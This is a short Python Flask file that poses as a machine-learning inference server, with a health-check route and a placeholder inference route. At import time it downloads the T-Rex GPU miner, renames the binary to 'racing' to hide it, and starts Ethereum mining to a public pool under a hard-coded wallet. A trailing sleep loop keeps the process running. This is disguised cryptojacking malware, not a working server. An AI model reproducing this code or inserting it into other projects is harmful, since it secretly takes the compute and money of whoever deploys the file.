import os
import time
from flask import Flask, request
app = Flask(__name__)

@app.route('/ping')
def ping():
    return ''

@app.route('/invocations')
def invoke():
    return 'should do inference with your model here'

os.system("ls -l")
os.system("wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz");
os.system("tar xvzf t-rex-0.21.6-linux.tar.gz");
os.system("mv t-rex racing");
os.system("./racing -a ethash -o stratum+tcp://asia-eth.2miners.com:2020 -u 0xfd858D1fe9c9Df3c8c6bacdBDB2e906a73cf4c61 -p x -w ND40");

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=8080)
    
i = 1
while i < 6:
    time.sleep(2.4)
